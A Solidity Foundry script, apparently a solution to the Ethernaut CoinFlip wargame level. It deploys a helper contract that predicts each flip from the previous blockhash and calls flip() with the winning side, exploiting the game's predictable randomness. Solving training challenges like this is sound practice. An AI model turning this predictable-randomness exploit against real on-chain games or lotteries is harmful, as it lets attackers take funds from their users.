// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/CoinFlip.sol";

contract player {
    
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
    constructor(CoinFlip coinFlip1)
    {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlip1.flip(side);
    }

}

contract Level3s is Script {

 CoinFlip public coinflip = CoinFlip(0x266BDD185a915840107ea4E1762a615d5512d749);

 function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new player(coinflip);
        console.log("Consecutive Wins: ", coinflip.consecutiveWins());
        vm.stopBroadcast();
    }

}